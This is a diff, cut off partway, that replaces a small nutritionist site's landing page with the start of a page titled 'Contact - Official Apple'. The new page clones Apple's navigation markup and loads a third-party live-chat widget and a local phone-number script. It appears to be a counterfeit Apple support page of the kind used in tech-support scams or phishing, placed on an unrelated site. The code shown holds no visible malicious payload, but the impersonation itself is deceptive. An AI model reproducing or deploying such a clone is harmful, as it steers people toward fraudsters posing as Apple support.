@@ -1,1588 +1,378 @@
- 
-
-<!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    
-    <title>Puregrazenate | Nutritionist - a personalized approach to your habits and lifestyle</title>
-    <meta property="og:title" content="Puregrazenate | Nutritionist - a personalized approach to your habits and lifestyle" />
-    <meta property="og:image" content="posts/09-08-2026/service_nutritionist_2026-08-08_2.jpg" />
-    <meta property="og:description" content="The modern pace of life presents us with dozens of daily challenges. Work, family, meetings, travel, education," />
-    <meta name="description" content="The modern pace of life presents us with dozens of daily challenges. Work, family, meetings, travel, education," />
-    <link rel="shortcut icon" href="icon.svg" type="image/x-icon" />
-     
-    <link href="https://fonts.googleapis.com/css2?family=Hind:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
-    <style>
-      *{
-        box-sizing: border-box;
-      }
-
-      html {
-        scroll-behavior: smooth;
-      }
-
-      body{
-        direction: ltr;
-        font-family: 'Hind', sans-serif !important;
-        font-size: clamp(12px, 4vw, 17px);
-        margin: 0;
-        padding: 0;
-        line-height: 1.4;
-      }
-
-      h1,
-      h2,
-      h3,
-      h4,
-      h5,
-      p{
-        padding: 0;
-        margin: 0;
-      }
-
-      p, li{
-        padding: 9px 0;
-        line-height: 1.4;
-      }
-
-      li{
-        margin: 0 9px;
-      }
-
-      a{
-        text-decoration: none;
-        color: inherit;
-        cursor: pointer;
-      }
-
-      img{
-        display: block;
-        max-width: 100%;
-        max-height: 100%;
-      }
-
-      ul{
-        margin: 0;
-        padding: 0;
-      }
-
-      .conteinSektion{
-        width: auto;
-        padding-right: 21px;
-        padding-left: 21px;
-        margin-right: auto;
-        margin-left: auto;
-        position: relative;
-      }
-
-      @media screen and (min-width: 480px) {
-        .conteinSektion{
-        max-width: 450px;
-        }
-      }
-      @media screen and (min-width: 575px){
-        .conteinSektion{
-          max-width: 540px;
-        }
-      }
-      @media screen and (min-width: 768px) {
-        .conteinSektion{
-        max-width: 730px;
-        }
-      }
-      @media screen and (min-width: 992px) {
-        .conteinSektion{
-          max-width: 960px;
-        }
-      }
-
-      @media screen and (min-width: 1200px){
-        .conteinSektion{
-          max-width: 1170px;
-          }
-      }
-
-      @media (min-width: 1400px){
-        .conteinSektion{
-          max-width: 1274px;
-        }
-      }
-
-      .page-privacy{
-        padding: 34px 0;
-        word-break: break-all;
-        color: #060606;
-        overflow: hidden;
-        text-align: justify;
-        width: 100%;
-      }
-
-      .title-politics{
-        font-size: clamp(22px, 4vw, 30px);
-      }
-
-      .page-privacy a{
-        transition: 0.3s ease;
-        word-break: break-all;
-        color: #060606;
-      }
-
-      .page-privacy a:hover{
-        color: #060606;
-        opacity: 0.5;
-      }
-      .page-privacy li {
-        list-style: disc;
-      }
-      .header-lay{
-        position: relative;
-        width: 100%;
-        background-position: center;
-        background-size: cover;
-        min-height: 100vh;
-      }
-
-      .header-lay::before{
-        content: "";
-        position: absolute;
-        top: 0;
-        right: 0;
-        width: 100%;
-        height: 100%;
-        filter: brightness(0.5);
-        background-attachment: fixed;
-        background-image: url(files/img/section-bg_uply0.jpg);
-        background-position: center;
-        background-size: cover;
-        z-index: -1;
-      }
-
-      .header{
-        display: flex;
-        flex-direction: row;
-        align-items: center;
-        justify-content: space-between;
-        gap: 20px;
-        padding: 26px 0;
-      }
-
-      .logo{
-        gap: 9px;
-        flex-direction:  row;
-        color: #fff;
-        display: flex;
-        align-items: center;
-        transition: 0.3s ease;
-      }
-
-      .logoImg img{
-        width: 50px;
-      }
-
-      .logoTitle h2{
-        transition: 0.3s ease;
-        color: #fff;
-        font-size: clamp(12px, 4vw, 30px);
-        margin: 0;
-      }
-
-      .logo:hover .logoTitle h2{
-        color: #009A44;
-      }
-
-      .nav-header{
-        flex-wrap: wrap;
-        list-style: none;
-        margin: 0;
-        padding: 0;
-        display: flex;
-        flex-direction: row;
-        align-items: center;
-        gap: 20px;
-      }
-
-      .nav-header li{
-        padding: 0;
-      }
-
-      .nav-header li a {
-        transition: 0.5s ease;
-        font-size: clamp(10px, 4vw, 17px);
-        color: #fff;
-        text-decoration: none;
-      }
-
-      .nav-header li a:hover{
-        color: #009A44;
-      }
-
-      .header-content{
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        gap: 91px;
-        min-height: 100vh;
-        padding: 62px 0;
-      }
-
-      .header-content h2{
-        text-transform: uppercase;
-        letter-spacing: 1px;
-        color: #fff;
-        font-size: 45px;
-      }
-
-      .header-content a{
-        margin: 0 auto;
-      }
-
-      .header-content a svg{
-        transition: 0.3s ease;
-        height: 62px;
-        width: 62px;
-        fill: #fff;
-      }
-
-      .header-content a svg:hover{
-        fill: #009A44;
-      }
-      .spesh-color {
-        color: #009A44;
-      }
-      .reasons{
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        gap: 62px;
-        padding: 62px 0;
-      }
-
-      .reasons h2{
-        text-align: center;
-        text-transform: uppercase;
-        letter-spacing: 1px;
-        font-size: clamp(22px, 4vw, 91px);
-        color: #060606b3;
-      }
-
-      .reasons-box{
-        width: 70%;
-        align-items: start;
-        display: grid;
-        grid-template-columns: repeat(3, 1fr);
-        gap: 34px;
-      }
-
-      .reasons-card{
-        display: flex;
-        flex-direction: row;
-        align-items: center;
-        gap: 9px;
-      }
-
-      .reasons-card h5{
-        font-weight: 700;
-        font-size: clamp(14px, 4vw, 18px);
-        color: #060606b3;
-      }
-
-      .reasons-card h5 span{
-        padding-right: 5px;
-        color: #009A44;
-      }
-
-      .reasons-img{
-        width: 50%;
-      }
-
-      .reasons-img img{
-        width: 100%;
-        height: 100%;
-        object-fit: contain;
-      }
-
-      .how-work-lay{
-        background-color: #009A44b3;
-        margin: 62px 0;
-      }
-
-      .how-work{
-        padding: 62px 0;
-      }
-
-      .how-work h2{
-        margin-bottom: 62px;
-        text-align: center;
-        text-transform: uppercase;
-        letter-spacing: 1px;
-        font-size: clamp(22px, 4vw, 91px);
-        color: #060606b3;
-      }
-
-      .how-work-box{
-        margin: 0 auto;
-        width: 70%;
-        align-items: start;
-        display: grid;
-        grid-template-columns: repeat(3, 1fr);
-        gap: 34px;
-      }
-
-      .how-work-card{
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        gap: 34px;
-      }
-
-      .how-work-card svg{
-        width: 62px;
-        height: 62px;
-        fill: #060606b3;
-      }
-
-      .how-work-card span{
-        width: 100%;
-        height: 5px;
-        background-color: #060606b3;
-      }
-
-      .how-work-card p{
-        padding: 0;
-        font-size: clamp(16px, 4vw, 18px);
-        color: #060606b3;
-      }
-
-      .partners{
-        padding: 62px 0;
-      }
-
-      .partners h2{
-        margin-bottom: 62px;
-        text-align: center;
-        text-transform: uppercase;
-        letter-spacing: 1px;
-        font-size: clamp(22px, 4vw, 91px);
-        color: #060606b3;
-      }
-
-      .companiLogo-box{
-        margin: 0 auto;
-        width: 70%;
-        align-items: start;
-        display: grid;
-        grid-template-columns: repeat(3, 1fr);
-        gap: 100px;
-      }
-
-      .companiLogo-img{
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        width: 100%;
-      }
-
-      .companiLogo-img img{
-        filter: drop-shadow(2px 4px 6px black);
-        object-fit: contain;
-        width: 100%;
-        height: 100%;
-      }
-
-      .art-page-lay{
-        background-color: #009A44b3;
-        margin: 62px 0;
-      }
-
-      .art-content{
-        padding: 62px 0;
-      }
-
-      .art-content h2{
-        margin-bottom: 62px;
-        text-align: center;
-        text-transform: uppercase;
-        letter-spacing: 1px;
-        font-size: clamp(22px, 4vw, 91px);
-        color: #060606b3;
-      }
-
-      .art-block{
-        overflow: hidden;
-        position: relative;
-      }
-
-      .art-block-images {
-        float: right;
-        width: 39%;
-        margin: 34px;
-        margin-top: 0;
-        margin-right: 0;
-      }
-
-      .art-block-content {
-        color: #060606b3;
-        font-size: clamp(16px, 4vw, 18px);
-      }
-
-      .art-block-content ul{
-        list-style: inside;
-      }
-
-      .price-text {
-        padding-top: 34px;
-        display: flex;
-        flex-direction: row;
-        align-items: center;
-        gap: 9px;
-        justify-content: flex-start;
-      }
-
-      .price-text h5 {
-        position: relative;
-        color: #060606b3;
-        font-size: clamp(16px, 4vw, 30px);
-        font-weight: bold;
-        padding: 11px;
-      }
-
-      .price-text h5::before,
-      .price-text h5::after {
-        content: "";
-        position: absolute;
-        height: 60%;
-        width: 100%;
-      }
-
-      .price-text h5::before {
-        top: 0;
-        left: 0;
-        border-left: 3px solid #060606b3;
-        border-top: 3px solid #060606b3;
-        width: 50%;
-      }
-
-      .price-text h5::after {
-        bottom: 0;
-        right: 0;
-        border-right: 3px solid #060606b3;
-        border-bottom: 3px solid #060606b3;
-        width: 50%;
-      }
-
-
-      .about-us{
-        padding: 62px 0;
-      }
-
-      .about-us h2{
-        margin-bottom: 26px;
-        text-transform: uppercase;
-        letter-spacing: 1px;
-        font-size: clamp(22px, 4vw, 91px);
-        color: #060606b3;
-      }
-
-      .about-us-box p{
-        padding: 0;
-        border-left: 3px solid #060606b3;
-        padding-left: 26px;
-        color: #060606b3;
-        font-size: clamp(16px, 4vw, 22px);
-      }
-
-      .link-button{
-        font-size: clamp(16px, 4vw, 22px);
-        cursor: pointer;
-        background-color: transparent;
-        transition: 0.3s ease;
-        border: 3px solid #060606b3;
-        color: #060606b3;
-        text-align: center;
-        padding: 9px 11px;
-      }
-
-      .link-button:hover{
-        background-color: #009A44b3;
-      }
-
-      .contacts-lay{
-        margin-top: 62px;
-        background-color: #009A44b3;
-      }
-
-      .contacts{
-        padding: 62px 0;
-      }
-
-      .contacts h2{
-        margin-bottom: 62px;
-        text-align: center;
-        text-transform: uppercase;
-        letter-spacing: 1px;
-        font-size: clamp(22px, 4vw, 91px);
-        color: #060606b3;
-      }
-
-      .contacts-box{
-        word-break: break-all;
-        display: flex;
-        align-items: center;
-        gap: 26px;
-        flex-direction: row;
-      }
-
-      .contacts-box-two{
-        border-right: 5px solid #060606b3;
-        border-left: 5px solid #060606b3;
-        padding: 0 26px;
-      }
-
-      .contacts-block{
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        text-align: center;
-        gap: 26px;
-        margin: 0 auto;
-        width: 70%;
-      }
-
-      .contacts-box a h5{
-        word-break: break-all;
-        font-size: clamp(16px, 4vw, 18px);
-        color: #060606b3;
-        transition: 0.3s ease;
-      }
-
-      .contacts-box a h5:hover{
-        opacity: 0.5;
-      }
-
-      .contacts-block h5{
-        font-size: clamp(16px, 4vw, 18px);
-        color: #060606b3;
-      }
-
-      .osn-form {
-        padding: 62px 0;
-        width: 70%;
-        margin: 0 auto;
-        display: flex;
-        flex-direction: column;
-      }
-
-      .title-container{
-        text-align: center;
-        margin-bottom: 34px;
-      }
-
-      .title-container h3{
-        text-transform: uppercase;
-        letter-spacing: 1px;
-        font-size: clamp(22px, 4vw, 91px);
-        color: #060606b3;
-      }
-
-      .input-container {
-        position: relative;
-        display: flex;
-        flex-direction: column;
-        gap: 11px;
-      }
-
-      .input-container label{
-        color: #060606b3;
-      }
-
-      .input-container .input-control--box-input, .input-container .textarea-control--box-input, .form button {
-        outline: none;
-        margin: 9px 0;
-      }
-
-      .input-container .input-control--box-input {
-        color: #060606b3;
-        background-color: #009A44b3;
-        padding: 20px;
-        border: none;
-        font-size: 0.875rem;
-        line-height: 1.25rem;
-      }
-
-      .input-container .textarea-control--box-input {
-        color: #060606b3;
-        background-color: #009A44b3;
-        padding: 20px;
-        border: none;
-        font-size: 0.875rem;
-        line-height: 1.25rem;
-        resize: vertical;
-        min-height: 34px;
-        max-height: 147px;
-      }
-
-      .input-container .input-control--box-input:focus, .input-container .textarea-control--box-input:focus, .input-container .input-control--box-input:hover, .input-container .textarea-control--box-input:hover{
-        border: 1px solid #060606b3;
-      }
-
-      .input-container .input-control--box-input::placeholder, .input-container .textarea-control--box-input::placeholder{
-        color: #060606b3;
-      }
-
-      .check{
-        transition: 0.3s ease;
-        color: #060606b3;
-      }
-
-      .check:hover{
-        opacity: 0.5;
-        color: #060606b3;
-      }
-
-      .form-check {
-        color: #060606b3;
-        display: flex;
-        align-items: center;
-        gap: 11px;
-        justify-content: flex-start;
-        padding: 11px 0;
-      }
-
-      .form-check .form-check-input{
-        margin: 0;
-      }
-
-      .submit-form {
-        margin: 0 auto !important;
-      }
-
-      .ui-checkbox {
-        --primary-color: #1677ff;
-        --secondary-color: #fff;
-        --primary-hover-color: #4096ff;
-        --checkbox-diameter: 20px;
-        --checkbox-border-radius: 5px;
-        --checkbox-border-color: #d9d9d9;
-        --checkbox-border-width: 1px;
-        --checkbox-border-style: solid;
-        --checkmark-size: 1.2;
-      }
-
-      .ui-checkbox,
-      .ui-checkbox *,
-      .ui-checkbox *::before,
-      .ui-checkbox *::after {
-        -webkit-box-sizing: border-box;
-        box-sizing: border-box;
-      }
-
-      .ui-checkbox {
-        -webkit-appearance: none;
-        -moz-appearance: none;
-        appearance: none;
-        width: var(--checkbox-diameter);
-        height: var(--checkbox-diameter);
-        border-radius: var(--checkbox-border-radius);
-        background: var(--secondary-color);
-        border: var(--checkbox-border-width) var(--checkbox-border-style) var(--checkbox-border-color);
-        -webkit-transition: all 0.3s;
-        -o-transition: all 0.3s;
-        transition: all 0.3s;
-        cursor: pointer;
-        position: relative;
-      }
-
-      .ui-checkbox::after {
-        content: "";
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        -webkit-box-shadow: 0 0 0 calc(var(--checkbox-diameter) / 2.5) var(--primary-color);
-        box-shadow: 0 0 0 calc(var(--checkbox-diameter) / 2.5) var(--primary-color);
-        border-radius: inherit;
-        opacity: 0;
-        -webkit-transition: all 0.5s cubic-bezier(0.12, 0.4, 0.29, 1.46);
-        -o-transition: all 0.5s cubic-bezier(0.12, 0.4, 0.29, 1.46);
-        transition: all 0.5s cubic-bezier(0.12, 0.4, 0.29, 1.46);
-      }
-
-      .ui-checkbox::before {
-        top: 40%;
-        left: 50%;
-        content: "";
-        position: absolute;
-        width: 4px;
-        height: 7px;
-        border-right: 2px solid var(--secondary-color);
-        border-bottom: 2px solid var(--secondary-color);
-        -webkit-transform: translate(-50%, -50%) rotate(45deg) scale(0);
-        -ms-transform: translate(-50%, -50%) rotate(45deg) scale(0);
-        transform: translate(-50%, -50%) rotate(45deg) scale(0);
-        opacity: 0;
-        -webkit-transition: all 0.1s cubic-bezier(0.71, -0.46, 0.88, 0.6),opacity 0.1s;
-        -o-transition: all 0.1s cubic-bezier(0.71, -0.46, 0.88, 0.6),opacity 0.1s;
-        transition: all 0.1s cubic-bezier(0.71, -0.46, 0.88, 0.6),opacity 0.1s;
-      }
-
-      .ui-checkbox:hover {
-        border-color: var(--primary-color);
-      }
-
-      .ui-checkbox:checked {
-        background: var(--primary-color);
-        border-color: transparent;
-      }
-
-      .ui-checkbox:checked::before {
-        opacity: 1;
-        -webkit-transform: translate(-50%, -50%) rotate(45deg) scale(var(--checkmark-size));
-        -ms-transform: translate(-50%, -50%) rotate(45deg) scale(var(--checkmark-size));
-        transform: translate(-50%, -50%) rotate(45deg) scale(var(--checkmark-size));
-        -webkit-transition: all 0.2s cubic-bezier(0.12, 0.4, 0.29, 1.46) 0.1s;
-        -o-transition: all 0.2s cubic-bezier(0.12, 0.4, 0.29, 1.46) 0.1s;
-        transition: all 0.2s cubic-bezier(0.12, 0.4, 0.29, 1.46) 0.1s;
-      }
-
-      .ui-checkbox:active:not(:checked)::after {
-        -webkit-transition: none;
-        -o-transition: none;
-        -webkit-box-shadow: none;
-        box-shadow: none;
-        transition: none;
-        opacity: 1;
-      }
-
-      .footer-lay{
-        background-color: #009A44b3;
-      }
-
-      .footer{
-        display: flex;
-        flex-direction: row;
-        align-items: start;
-        justify-content: space-between;
-        gap: 26px;
-        padding: 62px 0;
-      }
-
-      .logo-footer{
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        text-align: center;
-        gap: 9px;
-        flex: 1;
-      }
-
-      .logoImg-footer img{
-        width: 50px;
-      }
-
-      .logoTitle-footer h2{
-        transition: 0.3s ease;
-        color: #060606b3;
-        font-size: clamp(12px, 4vw, 30px);
-        margin: 0;
-      }
-
-      .logo-footer:hover .logoTitle-footer h2{
-        opacity: 0.5;
-      }
-
-      .menu-footer{
-        flex: 1;
-        list-style: none;
-        margin: 0;
-        padding: 0;
-        display: flex;
-        text-align: center;
-        align-items: center;
-        flex-direction: column;
-        justify-content: center;
-        gap: 26px;
-      }
-
-      .menu-footer span{
-        background-color: #060606b3;
-        width: 100%;
-        height: 5px;
-      }
-
-      .menu-footer li{
-        padding: 0;
-      }
-
-      .menu-footer li a{
-        transition: 0.3s ease;
-        color: #060606b3;
-        font-size: clamp(16px, 4vw, 18px);
-      }
-
-      .menu-footer li a:hover{
-        opacity: 0.5;
-      }
-
-      .privacy{
-        flex: 1;
-        display: flex;
-        text-align: center;
-        align-items: center;
-        flex-direction: column;
-        justify-content: center;
-        gap: 26px;
-      }
-
-      .privacy span{
-        background-color: #060606b3;
-        width: 100%;
-        height: 5px;
-      }
-
-      .privacy a{
-        transition: 0.3s ease;
-        color: #060606b3;
-        font-size: clamp(16px, 4vw, 18px);
-      }
-
-      .privacy a:hover{
-        opacity: 0.5;
-      }
-
-      .footer-bottom{
-        padding: 26px 0;
-      }
-
-      .footer-bottom p{
-        padding: 0;
-        text-align: center;
-        color: #060606b3;
-        font-size: clamp(16px, 4vw, 18px);
-      }
-
-      .toggle-navigation {
-        cursor: pointer;
-        display: none;
-        width: 30px;
-        height: 30px;
-        position: relative;
-        z-index: 100;
-        overflow: hidden;
-      }
-
-      .toggle-navigation span {
-        width: 20px;
-        height: 2px;
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        background-color: #fff;
-        transition: all 0.5s;
-      }
-
-      .toggle-navigation span:nth-of-type(2) {
-        top: calc(50% - 7px);
-      }
-
-      .toggle-navigation span:nth-of-type(3) {
-        top: calc(50% + 7px);
-      }
-
-      .toggle-navigation.active span:nth-of-type(1) {
-        display: none;
-      }
-
-      .toggle-navigation.active span:nth-of-type(2) {
-        background-color: #060606;
-        top: 50%;
-        transform: translate(-50%, 0%) rotate(45deg);
-      }
-
-      .toggle-navigation.active span:nth-of-type(3) {
-        background-color: #060606;
-        top: 50%;
-        transform: translate(-50%, 0%) rotate(-45deg);
-      }
-
-      .menu-navigation {
-        z-index: 99;
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        padding: 15px;
-        background: #fff;
-        transform: translateX(-110%);
-        transition: transform 0.5s;
-      }
-
-      .menu-navigation.active {
-        transform: translateX(0);
-      }
-
-      .menu-navigation nav {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        height: 100vh;
-      }
-
-      .menu-navigation ul {
-        display: flex;
-        text-align: center;
-        align-items: center;
-        flex-direction: column;
-        gap: 11px;
-        padding: 0;
-      }
-
-      .menu-navigation li {
-        list-style-type: none;
-      }
-
-      .navigation-link {
-        text-align: center;
-        font-size: clamp(16px, 4vw, 22px);
-        color: #060606;
-      }
-
-      .navigation-link:hover {
-        opacity: 0.5;
-      }
-
-      .animation-element {
-        opacity: 0;
-        transform: translateY(100px);
-        transition: opacity 3s ease-out, transform 3s ease-out;
-      }
-
-      .animation-element.visible {
-        opacity: 1;
-        transform: translateY(0);
-      }
-
-      .basic-content-nav{
-        position: fixed;
-        top: 50%;
-        z-index: 1;
-        right: 20px;
-        transform: translate(-50%, -50%);
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        gap: 11px;
-      }
-
-      .basic-content-nav a svg{
-        fill: transparent;
-        stroke: #a9a9a9;
-        stroke-width: 4px;
-        cursor: pointer;
-        height: 12px;
-        transition: all .2s ease-in-out;
-        width: 12px;
-      }
-
-      .basic-content-nav a svg:hover{
-        fill: #a9a9a9;
-      }
-
-      .danniTarif-plan {
-        margin: 62px 0;
-        overflow: hidden;
-
-        .row {
-          display: flex;
-          flex-direction: column;
-          gap: 11px;
-          flex-wrap: wrap;
-          justify-content: center;
-        }
-
-        .col {
-          width: 100%;
-          box-sizing: border-box;
-          padding: 11px;
-        }
-
-        .danniTarif-table-header {
-          background-color: #009A44b3;
-          color: #fff;
-          padding-top: 129px;
-          padding-bottom: 110px;
-        }
-
-        .danniTarif-table-title {
-          font-weight: bold;
-          margin-bottom: 26px;
-        }
-
-        .danniTarif-plans-tab {
-          -webkit-box-pack: center;
-          justify-content: center;
-        }
-        .danniTarif-plans-tab .list-group-item-action {
-          width: auto;
-          border: solid 1px #fff;
-          background-color: #fff;
-          color: #082357;
-          font-size: clamp(14px, 4vw, 16px);
-        }
-        .danniTarif-plans-tab .list-group-item-action.active {
-          background-color: #009A44b3;
-          color: #fff;
-        }
-
-        .danniTarif-card {
-          border: none;
-          border-radius: 4px;
-          margin-bottom: 26px;
-          -webkit-transition: all 0.6s;
-          transition: all 0.6s;
-          box-shadow: 0 0.5rem 1rem rgba(0, 0, 0, 0.15);
-          text-align: center;
-        }
-        .danniTarif-card .card-header {
-          background-color: #009A44b3;
-          color: #fff;
-          padding-top: 20px;
-          padding-bottom: 20px;
-        }
-        .danniTarif-card .card-body {
-          padding: 26px 9px;
-        }
-
-        .danniTarif-plan-title {
-          font-size: clamp(18px, 4vw, 20px);
-          color: inherit;
-          margin: 0;
-          font-weight: normal;
-        }
-
-        .danniTarif-plan-cost {
-          font-size: clamp(22px, 4vw, 28px);
-          font-weight: bold;
-          margin: 0;
-        }
-
-        .danniTarif-plan-features {
-          list-style: none;
-          padding-left: 0;
-          color: #303132;
-          font-size: clamp(14px, 4vw, 16px);
-          line-height: 2.86;
-          margin-bottom: 16px;
-        }
-        .danniTarif-plan-features li {
-          border-bottom: 1px solid #e3e3e3;
-        }
-        .danniTarif-plan-features li:last-child {
-          border-bottom: none;
-        }
-
-        .danniTarif-table-footer {
-          padding-top: 62px;
-          padding-bottom: 62px;
-          text-align: center;
-          color: #a5a5a5;
-          font-size: clamp(14px, 4vw, 16px);
-        }
-        .danniTarif-table-footer a {
-          color: inherit;
-          -webkit-transition: all 0.4s ease;
-          transition: all 0.4s ease;
-        }
-        .danniTarif-table-footer a:hover {
-          color: #333;
-          text-decoration: none;
-        }
-
-        @media (min-width: 576px) {
-          .row {
-            flex-direction: row;
-          }
-        }
-
-        @media (min-width: 992px) {
-          .col {
-            width: calc(33.333% - 20px);
-            flex-grow: 1;
-          }
-
-          .tab-content {
-            animation: fadeDown 1s linear;
-          }
-        }
-      }
-
-      @keyframes fadeDown {
-        0% {
-          opacity: 0;
-          transform: translateY(178px);
-        }
-        100% {
-          opacity: 1;
-          transform: translateY(0px);
-        }
-      }
-
-      .link-button-tarif{
-        word-break: break-all;
-        font-size: 10px;
-        cursor: pointer;
-        background-color: transparent;
-        transition: 0.3s ease;
-        border:  3px solid #060606b3;
-        color: #060606b3;
-        text-align: center;
-        padding: 9px;
-      }
-
-      .link-button-tarif:hover{
-        background-color: #009A44b3;
-      }
-
-
-      @media (max-width: 1199px) {
-        .contacts-block{
-          width: 100%;
-        }
-      }
-
-      @media (max-width: 991px) {
-        .header-content h2 {
-          font-size: 30px;
-        }
-        .nav-header{
-          display: none;
-        }
-
-        .toggle-navigation{
-          display: block;
-        }
-
-        .header-lay{
-          min-height: auto;
-        }
-
-        .header-content{
-          min-height: auto;
-        }
-
-        .reasons-box{
-          width: 100%;
-        }
-
-        .how-work-box{
-          width: 100%;
-        }
-
-        .companiLogo-box{
-          width: 100%;
-        }
-
-        .contacts-box{
-          align-items: stretch;
-          flex-direction: column;
-        }
-
-        .contacts-block{
-          align-items: stretch;
-        }
-
-        .contacts-box-two{
-          border-top: 5px solid #060606b3;
-          border-bottom: 5px solid #060606b3;
-          border-right: none;
-          border-left: none;
-          padding: 26px 0;
-        }
-
-        .contacts-box{
-          border-bottom: 5px solid #060606b3;
-          padding-bottom: 26px;
-        }
-
-        .osn-form{
-          width: 100%;
-        }
-
-        .header-lay::before{
-          background-attachment: unset;
-        }
-
-        .basic-content-nav{
-          display: none;
-        }
-      }
-
-      @media (max-width: 767px) {
-        .reasons-box{
-          grid-template-columns: repeat(1, 1fr);
-        }
-
-        .how-work-box{
-          grid-template-columns: repeat(1, 1fr);
-        }
-
-        .art-block-images{
-          width: 100%;
-          margin: 0 0 34px;
-        }
-
-        .reasons-img {
-          width: 100%;
-        }
-
-        .companiLogo-box{
-          grid-template-columns: repeat(2, 1fr);
-        }
-
-        .footer{
-          flex-direction: column;
-          align-items: stretch;
-        }
-        .header-content h2 {
-          font-size: 20px;
-        }
-      }
-
-      @media (max-width: 576px){
-        .companiLogo-box{
-          gap: 34px;
-        }
-        .header-content h2 {
-          font-size: 18px;
-        }
-      }
-    </style>
-
-    
-  </head>
-
-  <body>
-
-    
-
-    <div class="header-lay profileeu-modal">
-      <div class="conteinSektion">
-        <div class="header">
-          <a class="logo" href="./">
-            <div class="logoImg"><img src="icon.svg"  /></div>
-            <div class="logoTitle"><h2>Puregrazenate</h2></div>
-          </a>
-          <ul class="nav-header">
-            <li><a class="spesh-color" href="./">Home</a></li>
-            <li><a href="./#aboutus">About us</a></li>
-            <li><a href="./#part">Our Partners</a></li>
-            
-          </ul>
-          <div class="toggle-navigation">
-            <span></span>
-            <span></span>
-            <span></span>
-          </div>
-
-          <div class="menu-navigation">
-            <nav>
-              <ul>
-                <li>
-                  <a class="navigation-link spesh-color" href="./">Home</a>
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js"><head>
+
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-TI-_ABfYHKQY1aReo2_Yy.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script async="" src="https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t" charset="UTF-8" crossorigin="*"></script><script src="js/text_tel.js"></script>
+
+</head>
+
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
                 </li>
-                <li><a class="navigation-link" href="./#aboutus">About us</a></li>
-                <li><a class="navigation-link" href="./#part">Our Partners</a></li>
-                
-              </ul>
-            </nav>
-          </div>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
